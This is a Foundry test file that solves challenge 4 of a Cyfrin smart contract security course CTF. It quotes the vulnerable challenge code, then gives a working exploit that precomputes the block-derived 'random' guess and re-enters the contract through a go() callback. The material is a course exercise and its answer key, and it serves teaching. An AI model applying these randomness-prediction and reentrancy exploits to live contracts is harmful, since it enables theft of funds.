// SPDX-License-Identifier: MIT

pragma solidity =0.8.24;

import {console} from "forge-std/Test.sol";
import {Base} from "../Base.sol";

interface Challenge {
    function solveChallenge(uint256 guess, string memory yourTwitterHandle) external;
}
interface IERC721Receiver {
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4);
}

/*//////////////////////////////////////////////////////////////
                            CHALLENGE
//////////////////////////////////////////////////////////////*/
/*
function solveChallenge(uint256 guess, string memory yourTwitterHandle) external {
    (bool success, bytes memory returnData) = msg.sender.staticcall(abi.encodeWithSignature("owner()"));
    address ownerAddress;
    assembly {
        ownerAddress := mload(add(returnData, 32))
    }
    if (!success || ownerAddress != msg.sender) {
        revert S4__BadOwner();
    }
    if (myVal == 1) {
        uint256 rng =
            uint256(keccak256(abi.encodePacked(msg.sender, block.prevrandao, block.timestamp))) % 1_000_000;
        if (rng != guess) {
            revert S4__BadGuess();
        }
        _updateAndRewardSolver(yourTwitterHandle);
    } else {
        myVal = 1;
        (bool succ,) = msg.sender.call(abi.encodeWithSignature("go()"));
        if (!succ) {
            revert S4__BadReturn();
        }
    }
    myVal = 0;
}
*/

/*//////////////////////////////////////////////////////////////
                            SOLUTION
//////////////////////////////////////////////////////////////*/

/// @title Solution for challenge 4 for Cyfrin CTF
/// @author focusoor
///
/// @notice This challenge is part of Cytfin Updraft 'Smart Contract Security' course
/// @notice Link to course section: https://github.com/Cyfrin/security-and-auditing-full-course-s23?tab=readme-ov-file#section-4-nft
contract CtfCyfrin4 is Base {

    Challenge challenge = Challenge(CHALLENGE_4);

    function setUp() public override {
        Base.setUp();
    }

    function testSolveChallengeCtfCyfrin4() external {
        vm.selectFork(sepoliaFork);

        uint256 guess = uint256(keccak256(abi.encodePacked(address(this), block.prevrandao, block.timestamp))) % 1_000_000;
        assembly {
            tstore(0, guess)
        }

        vm.expectEmit();
        emit ChallengeSolved(address(this), address(challenge), TWITTER_HANDLE);
        challenge.solveChallenge(guess, TWITTER_HANDLE);
    }

    function owner() external view returns (address) {
        return address(this);
    }

    /// @notice here we know that myVal is 1 inside Challenge contract, so we can call solveChallenge again with the correct guess
    function go() external {
        uint256 guess;
        assembly {
            guess := tload(0)
        }
        challenge.solveChallenge(guess, TWITTER_HANDLE);
    }

    /// @notice because address(this) is msg.sender, we have to add receive method for contract
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
